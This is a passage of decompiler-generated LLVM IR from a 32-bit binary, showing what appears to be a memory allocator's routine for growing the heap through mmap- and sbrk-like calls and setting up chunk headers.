  br i1 %v6_8052bd1, label %dec_label_pc_8052e64, label %dec_label_pc_8052e5e

dec_label_pc_8052e5e:                             ; preds = %dec_label_pc_8052e3c
  %v0_8052e5e = load i32, i32* @edx, align 4
  store i32 %v0_8052e5e, i32* @global_var_8056bb0.208, align 16
  br label %dec_label_pc_8052e64

dec_label_pc_8052e64:                             ; preds = %dec_label_pc_8052e3c, %dec_label_pc_8052e5e
  %v4_8052e64 = or i32 %v1_8052f18, 1
  %v0_8052e69 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052e64, i32* %ebx.global-to-local, align 4
  %v1_8052e6f = or i32 %v0_8052e69, 1
  store i32 %v1_8052e6f, i32* %eax.global-to-local, align 4
  %v1_8052e72 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e72 = add i32 %v1_8052e72, 4
  %v3_8052e72 = inttoptr i32 %v2_8052e72 to i32*
  store i32 %v4_8052e64, i32* %v3_8052e72, align 4
  %v0_8052e75 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e75 = load i32, i32* @edx, align 4
  %v3_8052e75 = add i32 %v1_8052e75, %v0_8052e75
  %v4_8052e75 = inttoptr i32 %v3_8052e75 to i32*
  store i32 %v0_8052e75, i32* %v4_8052e75, align 4
  %v0_8052e78 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e78 = load i32, i32* @edx, align 4
  %v2_8052e78 = add i32 %v1_8052e78, 4
  %v3_8052e78 = inttoptr i32 %v2_8052e78 to i32*
  store i32 %v0_8052e78, i32* %v3_8052e78, align 4
  br label %dec_label_pc_8052e7b

dec_label_pc_8052e7b:                             ; preds = %dec_label_pc_8052e35, %dec_label_pc_8052e64
  %v0_8052e7b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e7b = add i32 %v0_8052e7b, 8
  store i32 %v1_8052e7b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8052e83.loopexit:                    ; preds = %dec_label_pc_8052dd0
  br label %dec_label_pc_8052e83

dec_label_pc_8052e83:                             ; preds = %dec_label_pc_8052e83.loopexit, %dec_label_pc_8052b8b, %dec_label_pc_8052b93
  %v0_8052e83 = load i32, i32* @global_var_8056bac.207, align 4
  store i32 %v0_8052e83, i32* @ebx, align 4
  %v1_8052e8d = add i32 %v1_8052f18, 16
  store i32 %v1_8052e8d, i32* @esi, align 4
  %v1_8052e90 = add i32 %v0_8052e83, 4
  %v2_8052e90 = inttoptr i32 %v1_8052e90 to i32*
  %v3_8052e90 = load i32, i32* %v2_8052e90, align 4
  %v1_8052e97 = and i32 %v3_8052e90, -4
  store i32 %v1_8052e97, i32* %ecx.global-to-local, align 4
  %v7_8052e9a = icmp ult i32 %v1_8052e97, %v1_8052e8d
  br i1 %v7_8052e9a, label %dec_label_pc_8052eba, label %dec_label_pc_8052e9e

dec_label_pc_8052e9e:                             ; preds = %dec_label_pc_8052e83
  %v2_8052ea2 = add i32 %v0_8052e83, %v1_8052f18
  store i32 %v2_8052ea2, i32* @edx, align 4
  %v1_8052ea5 = or i32 %v1_8052f18, 1
  store i32 %v1_8052ea5, i32* %eax.global-to-local, align 4
  store i32 %v2_8052ea2, i32* @global_var_8056bac.207, align 4
  store i32 %v1_8052ea5, i32* %v2_8052e90, align 4
  %v0_8052eb1 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052eb1 = sub i32 %v0_8052eb1, %v1_8052f18
  store i32 %v5_8052eb1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805320d

dec_label_pc_8052eba:                             ; preds = %dec_label_pc_8052e83
  %v0_8052eba = load i32, i32* @global_var_8056edc.212, align 4
  store i32 %v0_8052eba, i32* %edx.global-to-local, align 4
  %v0_8052ec0 = load i8, i8* @global_var_8056b80.206, align 128
  %v1_8052ec0 = and i8 %v0_8052ec0, 2
  %v2_8052ec0 = icmp eq i8 %v1_8052ec0, 0
  br i1 %v2_8052ec0, label %dec_label_pc_8052eee, label %dec_label_pc_8052ec9

dec_label_pc_8052ec9:                             ; preds = %dec_label_pc_8052eba
  store i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052ed1 = call i32 @function_8053741(i32* bitcast (i8* @global_var_8056b80.206 to i32*))
  store i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32* @ebx, align 4
  %v1_8052edb = add i32 %v1_8052f18, -7
  store i32 %v1_8052edb, i32* %eax.global-to-local, align 4
  store i32 %v1_8052edb, i32* %stack_var_-92, align 4
  %v1_8052edf = call i32 @function_8052b24(i32 %v1_8052edb)
  store i32 %v1_8052edf, i32* %eax.global-to-local, align 4
  store i32 %v1_8052edf, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8052eee:                             ; preds = %dec_label_pc_8052eba
  %v1_8052eee = add i32 %v0_8052eba, -1
  store i32 %v1_8052eee, i32* @ecx, align 4
  store i32 %v1_8052f18, i32* @ebx, align 4
  %v1_8052ef9 = load i32, i32* @global_var_8056ecc.213, align 4
  %v7_8052ef9 = icmp ult i32 %v1_8052f18, %v1_8052ef9
  br i1 %v7_8052ef9, label %dec_label_pc_8052fbb, label %dec_label_pc_8052f05

dec_label_pc_8052f05:                             ; preds = %dec_label_pc_8052eee
  %v0_8052f05 = load i32, i32* @global_var_8056ed0.214, align 16
  store i32 %v0_8052f05, i32* %eax.global-to-local, align 4
  %v1_8052f0a = load i32, i32* @global_var_8056ed4.215, align 4
  %v5_8052f10 = icmp slt i32 %v0_8052f05, %v1_8052f0a
  br i1 %v5_8052f10, label %dec_label_pc_8052f16, label %dec_label_pc_8052fbb

dec_label_pc_8052f16:                             ; preds = %dec_label_pc_8052f05
  %v2_8052f18 = add i32 %v1_8052f18, 10
  %v3_8052f18 = add i32 %v2_8052f18, %v0_8052eba
  %v1_8052f1c = sub i32 0, %v0_8052eba
  store i32 %v1_8052f1c, i32* %eax.global-to-local, align 4
  %v2_8052f1e = and i32 %v3_8052f18, %v1_8052f1c
  store i32 %v2_8052f1e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_8052f1e, %v1_8052f18
  br i1 %tmp128, label %dec_label_pc_8052f2a, label %dec_label_pc_8052fbb

dec_label_pc_8052f2a:                             ; preds = %dec_label_pc_8052f16
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052f37 = call i32 @function_8054368(i32 0, i32 %v2_8052f1e, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052eee, i32 %v1_8052eee)
  store i32 %v8_8052f37, i32* %eax.global-to-local, align 4
  store i32 %v8_8052f37, i32* @edx, align 4
  %v10_8052f41 = icmp eq i32 %v8_8052f37, -1
  br i1 %v10_8052f41, label %dec_label_pc_8052f2a.dec_label_pc_8052fbb_crit_edge, label %dec_label_pc_8052f46

dec_label_pc_8052f2a.dec_label_pc_8052fbb_crit_edge: ; preds = %dec_label_pc_8052f2a
  %v0_8052fbb.pre = load i32, i32* @global_var_8056bac.207, align 4
  br label %dec_label_pc_8052fbb

dec_label_pc_8052f46:                             ; preds = %dec_label_pc_8052f2a
  %v1_8052f48 = urem i32 %v8_8052f37, 8
  %v2_8052f48 = icmp eq i32 %v1_8052f48, 0
  store i32 %v1_8052f48, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052f48, label %dec_label_pc_8052f60, label %dec_label_pc_8052f4d

dec_label_pc_8052f4d:                             ; preds = %dec_label_pc_8052f46
  %v0_8052f52 = load i32, i32* @ebx, align 4
  %v2_8052f54 = sub nsw i32 8, %v1_8052f48
  store i32 %v2_8052f54, i32* %eax.global-to-local, align 4
  %v2_8052f56 = add i32 %v2_8052f54, %v8_8052f37
  store i32 %v2_8052f56, i32* @edx, align 4
  %v2_8052f58 = sub i32 %v0_8052f52, %v2_8052f54
  store i32 %v2_8052f58, i32* %esi.global-to-local, align 4
  %v2_8052f5a = inttoptr i32 %v2_8052f56 to i32*
  store i32 %v2_8052f54, i32* %v2_8052f5a, align 4
  br label %dec_label_pc_8052f68

dec_label_pc_8052f60:                             ; preds = %dec_label_pc_8052f46
  %v1_8052f60 = inttoptr i32 %v8_8052f37 to i32*
  store i32 0, i32* %v1_8052f60, align 4
  br label %dec_label_pc_8052f68

dec_label_pc_8052f68:                             ; preds = %dec_label_pc_8052f4d, %dec_label_pc_8052f60
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052f4d ], [ @ebx, %dec_label_pc_8052f60 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052f68 = or i32 %storemerge, 2
  %v1_8052f6b = load i32, i32* @edx, align 4
  %v2_8052f6b = add i32 %v1_8052f6b, 4
  %v3_8052f6b = inttoptr i32 %v2_8052f6b to i32*
  store i32 %v1_8052f68, i32* %v3_8052f6b, align 4
  %v0_8052f6e = load i32, i32* @global_var_8056ed0.214, align 16
  %v1_8052f73 = add i32 %v0_8052f6e, 1
  store i32 %v1_8052f73, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f73, i32* @global_var_8056ed0.214, align 16
  %v1_8052f79 = load i32, i32* @global_var_8056ed8.216, align 8
  %v7_8052f7f = icmp sgt i32 %v1_8052f73, %v1_8052f79
  br i1 %v7_8052f7f, label %dec_label_pc_8052f81, label %dec_label_pc_8052f86

dec_label_pc_8052f81:                             ; preds = %dec_label_pc_8052f68
  store i32 %v1_8052f73, i32* @global_var_8056ed8.216, align 8
  br label %dec_label_pc_8052f86

dec_label_pc_8052f86:                             ; preds = %dec_label_pc_8052f68, %dec_label_pc_8052f81
  %v0_8052f86 = load i32, i32* @global_var_8056ee4.217, align 4
  %v1_8052f8b = load i32, i32* @ebx, align 4
  %v2_8052f8b = add i32 %v1_8052f8b, %v0_8052f86
  store i32 %v2_8052f8b, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f8b, i32* @global_var_8056ee4.217, align 4
  %v1_8052f92 = load i32, i32* @global_var_8056ef0.218, align 16
  %tmp129 = icmp ugt i32 %v2_8052f8b, %v1_8052f92
  br i1 %tmp129, label %dec_label_pc_8052f9a, label %dec_label_pc_8052f9f

dec_label_pc_8052f9a:                             ; preds = %dec_label_pc_8052f86
  store i32 %v2_8052f8b, i32* @global_var_8056ef0.218, align 16
  br label %dec_label_pc_8052f9f

dec_label_pc_8052f9f:                             ; preds = %dec_label_pc_8052f86, %dec_label_pc_8052f9a
  %v1_8052f9f = load i32, i32* @global_var_8056ee8.219, align 8
  %v2_8052f9f = add i32 %v1_8052f9f, %v2_8052f8b
  store i32 %v2_8052f9f, i32* %eax.global-to-local, align 4
  %v1_8052fa5 = load i32, i32* @global_var_8056ef4.220, align 4
  %tmp130 = icmp ugt i32 %v2_8052f9f, %v1_8052fa5
  br i1 %tmp130, label %dec_label_pc_8052fb1, label %dec_label_pc_8052c02

dec_label_pc_8052fb1:                             ; preds = %dec_label_pc_8052f9f
  store i32 %v2_8052f9f, i32* @global_var_8056ef4.220, align 4
  br label %dec_label_pc_8052c02

dec_label_pc_8052fbb:                             ; preds = %dec_label_pc_8052f16, %dec_label_pc_8052f2a.dec_label_pc_8052fbb_crit_edge, %dec_label_pc_8052f05, %dec_label_pc_8052eee
  %v0_8052fbb = phi i32 [ %v0_8052fbb.pre, %dec_label_pc_8052f2a.dec_label_pc_8052fbb_crit_edge ], [ %v0_8052e83, %dec_label_pc_8052f05 ], [ %v0_8052e83, %dec_label_pc_8052f16 ], [ %v0_8052e83, %dec_label_pc_8052eee ]
  store i32 %v0_8052fbb, i32* %eax.global-to-local, align 4
  %v1_8052fc4 = add i32 %v0_8052fbb, 4
  %v2_8052fc4 = inttoptr i32 %v1_8052fc4 to i32*
  %v3_8052fc4 = load i32, i32* %v2_8052fc4, align 4
  %v1_8052fce = and i32 %v3_8052fc4, -4
  %v2_8052fce = icmp eq i32 %v1_8052fce, 0
  store i32 %v1_8052fce, i32* @ebp, align 4
  %v1_8052fd1 = load i32, i32* @global_var_8056ec8.221, align 8
  %v2_8052fd1 = add i32 %v1_8052fd1, %v1_8052e8d
  store i32 %v2_8052fd1, i32* %eax.global-to-local, align 4
  %v0_8052fd7 = load i8, i8* @global_var_8056ee0.222, align 32
  %v1_8052fd7 = urem i8 %v0_8052fd7, 2
  %v2_8052fd7 = icmp eq i8 %v1_8052fd7, 0
  br i1 %v2_8052fd7, label %dec_label_pc_8052fe2, label %dec_label_pc_8052fe0

dec_label_pc_8052fe0:                             ; preds = %dec_label_pc_8052fbb
  %v2_8052fe0 = sub i32 %v2_8052fd1, %v1_8052fce
  store i32 %v2_8052fe0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fe2

dec_label_pc_8052fe2:                             ; preds = %dec_label_pc_8052fbb, %dec_label_pc_8052fe0
  %v0_8052fe6 = phi i32 [ %v2_8052fd1, %dec_label_pc_8052fbb ], [ %v2_8052fe0, %dec_label_pc_8052fe0 ]
  %v5_8052fe6 = add i32 %v0_8052fe6, %v1_8052eee
  store i32 %v5_8052fe6, i32* %eax.global-to-local, align 4
  %v1_8052fea = sub i32 0, %v0_8052eba
  store i32 %v1_8052fea, i32* @edx, align 4
  %v2_8052ff2 = and i32 %v5_8052fe6, %v1_8052fea
  store i32 %v2_8052ff2, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8052ff2, 1
  br i1 %tmp91, label %dec_label_pc_805300c, label %dec_label_pc_8052ff6

dec_label_pc_8052ff6:                             ; preds = %dec_label_pc_8052fe2
  store i32 %v2_8052ff2, i32* %stack_var_-92, align 4
  %v1_8052ffa = call i32 @function_8054819(i32 %v2_8052ff2)
  store i32 %v1_8052ffa, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8052ffa, i32* @ebx, align 4
  %v10_8053007 = icmp eq i32 %v1_8052ffa, -1
  %v1_805300a = icmp eq i1 %v10_8053007, false
  br i1 %v1_805300a, label %dec_label_pc_8053062.dec_label_pc_805306b_crit_edge, label %dec_label_pc_8052ff6.dec_label_pc_805300c_crit_edge

dec_label_pc_8052ff6.dec_label_pc_805300c_crit_edge: ; preds = %dec_label_pc_8052ff6
  %v0_805300c.pre = load i8, i8* @global_var_8056ee0.222, align 32
  br label %dec_label_pc_805300c

dec_label_pc_805300c:                             ; preds = %dec_label_pc_8052ff6.dec_label_pc_805300c_crit_edge, %dec_label_pc_8052fe2
  %v0_8053038 = phi i32 [ -1, %dec_label_pc_8052ff6.dec_label_pc_805300c_crit_edge ], [ %v1_8052fea, %dec_label_pc_8052fe2 ]
  %v0_805300c = phi i8 [ %v0_805300c.pre, %dec_label_pc_8052ff6.dec_label_pc_805300c_crit_edge ], [ %v0_8052fd7, %dec_label_pc_8052fe2 ]
  %v1_805300c = urem i8 %v0_805300c, 2
  %v2_805300c = icmp eq i8 %v1_805300c, 0
  br i1 %v2_805300c, label %dec_label_pc_805300c.dec_label_pc_8053021_crit_edge, label %dec_label_pc_8053015

dec_label_pc_805300c.dec_label_pc_8053021_crit_edge: ; preds = %dec_label_pc_805300c
  %v0_8053021.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053021

dec_label_pc_8053015:                             ; preds = %dec_label_pc_805300c
  %v2_8053019 = add i32 %v1_8052fce, %v1_8052eee
  store i32 %v2_8053019, i32* %eax.global-to-local, align 4
  %v0_805301b = load i32, i32* @esi, align 4
  %v2_805301b = add i32 %v0_805301b, %v2_8053019
  %v5_805301d = and i32 %v2_805301b, %v1_8052fea
  store i32 %v5_805301d, i32* @esi, align 4
  br label %dec_label_pc_8053021

dec_label_pc_8053021:                             ; preds = %dec_label_pc_805300c.dec_label_pc_8053021_crit_edge, %dec_label_pc_8053015
  %v0_8053021 = phi i32 [ %v0_8053021.pre, %dec_label_pc_805300c.dec_label_pc_8053021_crit_edge ], [ %v5_805301d, %dec_label_pc_8053015 ]
  %tmp131 = icmp ult i32 %v0_8053021, 1048576
  br i1 %tmp131, label %dec_label_pc_8053029, label %dec_label_pc_805302e

dec_label_pc_8053029:                             ; preds = %dec_label_pc_8053021
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805302e

dec_label_pc_805302e:                             ; preds = %dec_label_pc_8053021, %dec_label_pc_8053029
  %v0_8053042 = phi i32 [ %v0_8053021, %dec_label_pc_8053021 ], [ 1048576, %dec_label_pc_8053029 ]
  %tmp132 = icmp ugt i32 %v0_8053042, %v1_8052f18
  br i1 %tmp132, label %dec_label_pc_8053038, label %dec_label_pc_8053270

dec_label_pc_8053038:                             ; preds = %dec_label_pc_805302e
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053045 = call i32 @function_8054368(i32 0, i32 %v0_8053042, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053038, i32 %v0_8053038)
  store i32 %v8_8053045, i32* %eax.global-to-local, align 4
  store i32 %v8_8053045, i32* @ebx, align 4
  %v10_805304f = icmp eq i32 %v8_8053045, -1
  br i1 %v10_805304f, label %dec_label_pc_8053270, label %dec_label_pc_8053062.thread

dec_label_pc_8053062.thread:                      ; preds = %dec_label_pc_8053038
  %v0_8053058 = load i8, i8* @global_var_8056ee0.222, align 1
  %v2_8053058 = and i8 %v0_8053058, -2
  store i8 %v2_8053058, i8* @global_var_8056ee0.222, align 32
  %v1_805305f = load i32, i32* @esi, align 4
  %v2_805305f = add i32 %v1_805305f, %v8_8053045
  store i32 %v2_805305f, i32* @edx, align 4
  br label %dec_label_pc_805306b

dec_label_pc_8053062.dec_label_pc_805306b_crit_edge: ; preds = %dec_label_pc_8052ff6
  %v1_805306f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805306b

dec_label_pc_805306b:                             ; preds = %dec_label_pc_8053062.dec_label_pc_805306b_crit_edge, %dec_label_pc_8053062.thread
  %v1_805306f = phi i32 [ %v1_805305f, %dec_label_pc_8053062.thread ], [ %v1_805306f.pre, %dec_label_pc_8053062.dec_label_pc_805306b_crit_edge ]
  %v0_805313794 = phi i32 [ %v8_8053045, %dec_label_pc_8053062.thread ], [ %v1_8052ffa, %dec_label_pc_8053062.dec_label_pc_805306b_crit_edge ]
  %v0_805312993 = phi i32 [ %v2_805305f, %dec_label_pc_8053062.thread ], [ -1, %dec_label_pc_8053062.dec_label_pc_805306b_crit_edge ]
  %v0_805306f = load i32, i32* @global_var_8056ee8.219, align 8
  %v2_805306f = add i32 %v1_805306f, %v0_805306f
  store i32 %v2_805306f, i32* @global_var_8056ee8.219, align 8
  %v2_8053075 = add i32 %v1_8052fce, %v0_8052fbb
  store i32 %v2_8053075, i32* %ecx.global-to-local, align 4
  %v2_8053077 = sub i32 %v0_805313794, %v2_8053075
  %v7_8053077 = icmp ult i32 %v0_805313794, %v2_8053075
  %v12_8053077 = icmp eq i32 %v2_8053077, 0
  %v1_8053079 = icmp eq i1 %v12_8053077, false
  br i1 %v1_8053079, label %dec_label_pc_8053092, label %dec_label_pc_805307b

dec_label_pc_805307b:                             ; preds = %dec_label_pc_805306b
  %v10_805307b = icmp eq i32 %v0_805312993, -1
  %v1_805307e = icmp eq i1 %v10_805307b, false
  br i1 %v1_805307e, label %dec_label_pc_8053092, label %dec_label_pc_8053080

dec_label_pc_8053080:                             ; preds = %dec_label_pc_805307b
  %v2_8053080 = add i32 %v1_805306f, %v1_8052fce
  store i32 %v0_8052fbb, i32* %ecx.global-to-local, align 4
  %v1_8053087 = or i32 %v2_8053080, 1
  store i32 %v1_8053087, i32* %eax.global-to-local, align 4
  store i32 %v1_8053087, i32* %v2_8052fc4, align 4
  br label %dec_label_pc_80531bf

dec_label_pc_8053092:                             ; preds = %dec_label_pc_805307b, %dec_label_pc_805306b
  %v0_8053092 = load i8, i8* @global_var_8056ee0.222, align 1
  %v1_8053092 = sext i8 %v0_8053092 to i32
  store i32 %v1_8053092, i32* %eax.global-to-local, align 4
  %v2_8053097 = urem i8 %v0_8053092, 2
  %v3_8053097 = icmp eq i8 %v2_8053097, 0
  br i1 %v3_8053097, label %dec_label_pc_80530ab, label %dec_label_pc_805309b

dec_label_pc_805309b:                             ; preds = %dec_label_pc_8053092
  br i1 %v2_8052fce, label %dec_label_pc_80530ab, label %dec_label_pc_805309f

dec_label_pc_805309f:                             ; preds = %dec_label_pc_805309b
  %v1_80530a1 = icmp eq i1 %v7_8053077, false
  br i1 %v1_80530a1, label %dec_label_pc_80530ab, label %dec_label_pc_80530a3

dec_label_pc_80530a3:                             ; preds = %dec_label_pc_805309f
  %v1_80530a3 = and i32 %v1_8053092, -2
  %v4_80530a3 = trunc i32 %v1_80530a3 to i8
  store i32 %v1_80530a3, i32* %eax.global-to-local, align 4
  store i8 %v4_80530a3, i8* @global_var_8056ee0.222, align 32
  br label %dec_label_pc_80530ab

dec_label_pc_80530ab:                             ; preds = %dec_label_pc_805309f, %dec_label_pc_805309b, %dec_label_pc_8053092, %dec_label_pc_80530a3
  %v0_80530ab = phi i8 [ %v0_8053092, %dec_label_pc_805309f ], [ %v0_8053092, %dec_label_pc_805309b ], [ %v0_8053092, %dec_label_pc_8053092 ], [ %v4_80530a3, %dec_label_pc_80530a3 ]
  %v1_80530ab = urem i8 %v0_80530ab, 2
  %v2_80530ab = icmp eq i8 %v1_80530ab, 0
  br i1 %v2_80530ab, label %dec_label_pc_8053129, label %dec_label_pc_80530b4

dec_label_pc_80530b4:                             ; preds = %dec_label_pc_80530ab
  br i1 %v2_8052fce, label %dec_label_pc_80530c2, label %dec_label_pc_80530b8

dec_label_pc_80530b8:                             ; preds = %dec_label_pc_80530b4
  store i32 %v2_8053077, i32* %eax.global-to-local, align 4
  %v2_80530bc = add i32 %v2_805306f, %v2_8053077
  store i32 %v2_80530bc, i32* @global_var_8056ee8.219, align 8
  br label %dec_label_pc_80530c2

dec_label_pc_80530c2:                             ; preds = %dec_label_pc_80530b4, %dec_label_pc_80530b8
  %v1_80530c4 = urem i32 %v0_805313794, 8
  %v2_80530c4 = icmp eq i32 %v1_80530c4, 0
  store i32 %v1_80530c4, i32* %edx.global-to-local, align 4
  %v1_80530c7 = icmp eq i1 %v2_80530c4, false
  br i1 %v1_80530c7, label %dec_label_pc_80530cf, label %dec_label_pc_80530c9

dec_label_pc_80530c9:                             ; preds = %dec_label_pc_80530c2
  store i32 %v0_805313794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530d9

dec_label_pc_80530cf:                             ; preds = %dec_label_pc_80530c2
  %v2_80530d4 = sub nsw i32 8, %v1_80530c4
  store i32 %v2_80530d4, i32* %eax.global-to-local, align 4
  %v2_80530d6 = add i32 %v2_80530d4, %v0_805313794
  store i32 %v2_80530d6, i32* @edi, align 4
  br label %dec_label_pc_80530d9

dec_label_pc_80530d9:                             ; preds = %dec_label_pc_80530c9, %dec_label_pc_80530cf
  %v0_80530dc = phi i32 [ 0, %dec_label_pc_80530c9 ], [ %v2_80530d4, %dec_label_pc_80530cf ]
  %v2_80530d9 = add i32 %v1_805306f, %v0_805313794
  %v2_80530dc = add i32 %v0_80530dc, %v1_8052fce
  store i32 %v2_80530dc, i32* %ecx.global-to-local, align 4
  %v2_80530e5 = add i32 %v2_80530dc, %v2_80530d9
  store i32 %v2_80530e5, i32* %edx.global-to-local, align 4
  %v2_80530eb = add i32 %v2_80530e5, %v1_8052eee
  %v5_80530ee = and i32 %v2_80530eb, %v1_8052fea
  %v2_80530f5 = sub i32 %v5_80530ee, %v2_80530e5
  store i32 %v2_80530f5, i32* %eax.global-to-local, align 4
  %v2_80530f7 = add i32 %v2_80530f5, %v2_80530dc
  store i32 %v2_80530f7, i32* @esi, align 4
  store i32 %v2_80530f7, i32* %stack_var_-92, align 4
  %v1_80530fb = call i32 @function_8054819(i32 %v2_80530f7)
  store i32 %v1_80530fb, i32* %eax.global-to-local, align 4
  store i32 %v1_80530fb, i32* @edx, align 4
  %v10_8053105 = icmp eq i32 %v1_80530fb, -1
  %v1_8053108 = icmp eq i1 %v10_8053105, false
  br i1 %v1_8053108, label %dec_label_pc_8053118, label %dec_label_pc_805310a

dec_label_pc_805310a:                             ; preds = %dec_label_pc_80530d9
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805310f = call i32 @function_8054819(i32 0)
  store i32 %v1_805310f, i32* %eax.global-to-local, align 4
  store i32 %v1_805310f, i32* @edx, align 4
  br label %dec_label_pc_805314c

dec_label_pc_8053118:                             ; preds = %dec_label_pc_80530d9
  %v1_8053118 = load i32, i32* @ebx, align 4
  %v7_8053118 = icmp ult i32 %v1_80530fb, %v1_8053118
  %v1_805311a = icmp eq i1 %v7_8053118, false
  br i1 %v1_805311a, label %dec_label_pc_8053151, label %dec_label_pc_805311c

dec_label_pc_805311c:                             ; preds = %dec_label_pc_8053118
  %v0_805311c = load i8, i8* @global_var_8056ee0.222, align 1
  %v2_805311c = and i8 %v0_805311c, -2
  store i8 %v2_805311c, i8* @global_var_8056ee0.222, align 32
  store i32 %v2_80530d9, i32* @edx, align 4
  br label %dec_label_pc_8053130

dec_label_pc_8053129:                             ; preds = %dec_label_pc_80530ab
  %v10_8053129 = icmp eq i32 %v0_805312993, -1
  br i1 %v10_8053129, label %dec_label_pc_8053134, label %dec_label_pc_805312e

dec_label_pc_805312e:                             ; preds = %dec_label_pc_8053129
  store i32 %v0_805313794, i32* @edi, align 4
  br label %dec_label_pc_8053130

dec_label_pc_8053130:                             ; preds = %dec_label_pc_805311c, %dec_label_pc_805312e
  %v0_805315158 = phi i32 [ %v2_80530d9, %dec_label_pc_805311c ], [ %v0_805312993, %dec_label_pc_805312e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053151

dec_label_pc_8053134:                             ; preds = %dec_label_pc_8053129
  store i32 %v0_805313794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805313b = call i32 @function_8054819(i32 0)
  store i32 %v1_805313b, i32* @edx, align 4
  %v1_8053142 = load i32, i32* @ebx, align 4
  %v2_8053142 = sub i32 %v1_805313b, %v1_8053142
  %v1_8053144 = load i32, i32* @esi, align 4
  %v2_8053144 = sub i32 %v2_8053142, %v1_8053144
  store i32 %v2_8053144, i32* %eax.global-to-local, align 4
  %v0_8053146 = load i32, i32* @global_var_8056ee8.219, align 8
  %v2_8053146 = add i32 %v0_8053146, %v2_8053144
  store i32 %v2_8053146, i32* @global_var_8056ee8.219, align 8
  br label %dec_label_pc_805314c

dec_label_pc_805314c:                             ; preds = %dec_label_pc_805310a, %dec_label_pc_8053134
  %v0_805315157 = phi i32 [ %v1_805310f, %dec_label_pc_805310a ], [ %v1_805313b, %dec_label_pc_8053134 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053151

dec_label_pc_8053151:                             ; preds = %dec_label_pc_8053118, %dec_label_pc_8053130, %dec_label_pc_805314c
  %v0_8053156 = phi i32 [ %v1_80530fb, %dec_label_pc_8053118 ], [ %v0_805315158, %dec_label_pc_8053130 ], [ %v0_805315157, %dec_label_pc_805314c ]
  %v10_8053151 = icmp eq i32 %v0_8053156, -1
  br i1 %v10_8053151, label %dec_label_pc_80531bf, label %dec_label_pc_8053156

dec_label_pc_8053156:                             ; preds = %dec_label_pc_8053151
  %v1_8053156 = load i32, i32* @edi, align 4
  %v2_8053156 = sub i32 %v0_8053156, %v1_8053156
  store i32 %v2_8053156, i32* @edx, align 4
  store i32 %v1_8053156, i32* @global_var_8056bac.207, align 4
  %v1_805315e = load i32, i32* @esi, align 4
  %v2_805315e = add i32 %v1_805315e, %v2_8053156
  %v1_8053161 = or i32 %v2_805315e, 1
  store i32 %v1_8053161, i32* %eax.global-to-local, align 4
  %v2_8053164 = add i32 %v1_8053156, 4
  %v3_8053164 = inttoptr i32 %v2_8053164 to i32*
  store i32 %v1_8053161, i32* %v3_8053164, align 4
  %v0_8053167 = load i32, i32* @global_var_8056ee8.219, align 8
  %v1_8053167 = load i32, i32* @esi, align 4
  %v2_8053167 = add i32 %v1_8053167, %v0_8053167
  store i32 %v2_8053167, i32* @global_var_8056ee8.219, align 8
  br i1 %v2_8052fce, label %dec_label_pc_80531bf, label %dec_label_pc_8053171

dec_label_pc_8053171:                             ; preds = %dec_label_pc_8053156
  %v1_8053171 = add i32 %v1_8052fce, -12
  store i32 %v0_8052fbb, i32* %ecx.global-to-local, align 4
  %v1_8053178 = and i32 %v1_8053171, -8
  store i32 %v1_8053178, i32* %eax.global-to-local, align 4
  %v1_805317d = or i32 %v1_8053178, 1
  store i32 %v1_805317d, i32* @edx, align 4
  %v5_8053180 = icmp ult i32 %v1_8053178, 15
  store i32 %v1_805317d, i32* %v2_8052fc4, align 4
  %v0_8053186 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053186 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053186 = add i32 %v0_8053186, 4
  %v3_8053186 = add i32 %v2_8053186, %v1_8053186
  %v4_8053186 = inttoptr i32 %v3_8053186 to i32*
  store i32 5, i32* %v4_8053186, align 4
  %v0_805318e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805318e = load i32, i32* %eax.global-to-local, align 4
  %v2_805318e = add i32 %v0_805318e, 8
  %v3_805318e = add i32 %v2_805318e, %v1_805318e
  %v4_805318e = inttoptr i32 %v3_805318e to i32*
  store i32 5, i32* %v4_805318e, align 4
  br i1 %v5_8053180, label %dec_label_pc_80531bf, label %dec_label_pc_8053198

dec_label_pc_8053198:                             ; preds = %dec_label_pc_8053171
  %v0_805319b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805319d = add i32 %v0_805319b, 8
  store i32 %v1_805319d, i32* %eax.global-to-local, align 4
  %v0_80531a0 = load i32, i32* @global_var_8056ec4.223, align 4
  store i32 %v0_80531a0, i32* @ebx, align 4
  store i32 %v1_805319d, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056ec4.223, align 4
